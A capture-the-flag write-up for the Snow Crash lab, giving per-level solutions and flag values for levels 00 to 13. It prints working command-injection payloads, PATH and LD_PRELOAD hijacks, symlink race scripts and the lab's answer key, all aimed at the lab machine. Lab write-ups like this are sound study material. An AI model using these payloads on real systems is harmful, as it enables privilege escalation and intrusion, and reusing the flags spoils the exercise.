# 42snow_crash
## Level 00

- **Command**: `find / -user flag00 2>/dev/null`
- **File Content**: `cat /usr/sbin/john` yields `cdiiddwpgswtgt`
- **Decryption**: Caesar cipher decryption of `cdiiddwpgswtgt` gives `nottoohardhere`
- **Flag**: `x24ti5gi3x0ol2eh4esiuxias`

## Level 01

- **Encrypted Password**: `42hDRfypTqqnw`
- **Details**: Uses DES for encryption. The password for DES encryption (mode 1500 in hashcat) is `abcdefg`.
- **Flag**: `f2av5il02puano7naaf6adaaf`

## Level 02

- **Task**: Analyze a pcap file in Wireshark.
- **Password Reconstruction**: Password `ft_wandr...NDRel.L0L` with incorrect deletion attempts, corrected to `ft_waNDReL0L`.
- **Flag**: `kooda2puivaav1idi4f57q8iq`

## Level 03

- **Solution**: Create a script named "echo" that executes `getflag`.
  ```sh
  exec getflag
  ```
  Set the PATH to include the script directory.
  ```sh
  export PATH=/tmp:$PATH
  ```
- **Flag**: `qi0maab88jeaj46qoumi7maus`

## Level 04

- **Vulnerability**: Web injection.
- **Solution**: Access `http://192.168.1.31:4747/?x=$(getflag)`.
- **Flag**: `ne2searoevaevoem4ov4ar8ap`

## Level 05

- **Command**: `find / -user flag05 -type f -exec ls -lahh {} \; 2> /dev/null` to find the script
- **Task**: Locate a script executed by `flag05` and append a command to write the flag to `/tmp/out`.
  ```sh
  getflag > /tmp/out
  ```
  Monitor `/tmp/out` for the flag.
- **Flag**: `viuaaale9huek52boumoomioc`

## Level 06

- **Resources**:
  - [Understanding preg_replace filtering exploitation](https://security.stackexchange.com/questions/151142/understanding-preg-replace-filtering-exploitation)
  - [Identify and execute PHP code on a string](https://stackoverflow.com/questions/6103175/identify-and-execute-php-code-on-a-string)
- **Solution**: Use the input `[x {${shell_exec(getflag)}}]` in `/tmp/in`. The `${{}}` syntax allows for expression evaluation.
- **Execution**: `./level06 /tmp/in`
- **Flag**: `wiok45aaoguiboiki2tuin6ub`

## Level 07
- **Solution**: Inject env variable called LOGNAME
- **Execution**: `LOGNAME='$(getflag)' ./level07`
- **Flag**: `fiumuikeil55xe9cu4dood66h`

## Level 08
- **Solution**: make a symlink from token file as the level08 prgram compare filename
- **Execution**: ln -s token /tmp/dddw && ./level08 /tmp/dddw
- `quif5eloekouj29ke0vouxean`
- **Flag**: `25749xKZ8L7DkSCwJkT9dyv6f`

## Level 09
- **Solution**: write a ugly c script
- **Execution**: run c script
- **Output**: `f3iji1ju5yuevaus41q1afiuq`
- **Flag**: `s5cAJpM8ev6XHw998pRWG728z`


## Level 10
```sh
#!/bin/bash
while :
do
	/home/user/level10/level10 /tmp/data 127.0.0.1
  sleep 0.1
done

#!/bin/bash
while :
do
	nc -l 6969
  sleep 0.1
done

#!/bin/bash
touch /tmp/fake_token
while :
do
	ln -s /tmp/fake_token /tmp/data
  ln -s /home/user/level10/token /tmp/data
  sleep 0.1
done

```
- **Solution**: write a ugly c script
- **Execution**: run c script
- **Output**: `woupa2yuojeeaaed06riuj63c`
- **Flag**: `feulo4b72j7edeahuete3no7c`


## Level 11
- **Solution**: Inject shell command into the password
```sh
level10@SnowCrash:~$ nc 127.0.0.1 5151
Password: $(getflag > /tmp/out)
Erf nope..
level10@SnowCrash:~$ cat /tmp/out
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```
- **Flag**: `fa6v5ateaw21peobuub8ipe6s`

## Level 12
- **Solution**: Inject schell script path to url and escape it
- **Execution**: `curl 'http://192.168.1.31:4646/?x=\`/*/B\``
```sh
level12@SnowCrash:~$ egrep "`/tmp/B`" /tmp/xd
egrep: /tmp/xd: No such file or directory
level12@SnowCrash:~$ cat /tmp/B
#!/bin/bash
getflag > /tmp/flag
level12@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token :
Nope there is no token here for you sorry. Try again :)
level12@SnowCrash:~$ egrep "`/tmp/B`" /tmp/xd
egrep: /tmp/xd: No such file or directory
level12@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
level12@SnowCrash:~$ cat /tmp/B
#!/bin/bash
getflag > /tmp/flag
```


## Level 13
- **Solution**: Create a shared library to override the `getuid` function.
- **Execution**: `gdb level13` and set the `LD_PRELOAD` environment variable to the shared library.
- **Flag**: `2A31L79asukciNyi8uppkEuSx`
```sh
level13@SnowCrash:/tmp$ export export LD_PRELOAD=/path/to/mygetuid.so^C
level13@SnowCrash:/tmp$ export LD_PRELOAD=/tmp/mygetuid.so
level13@SnowCrash:/tmp$ cd
level13@SnowCrash:~$ level13
UID 2013 started us but we we expect 4242
level13@SnowCrash:~$ gdb level13
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level13/level13...(no debugging symbols found)...done.
(gdb) set environment LD_PRELOAD /tmp/mygetuid.so
(gdb) r
Starting program: /home/user/level13/level13
your token is 2A31L79asukciNyi8uppkEuSx
[Inferior 1 (process 26970) exited with code 050]
(gdb)
```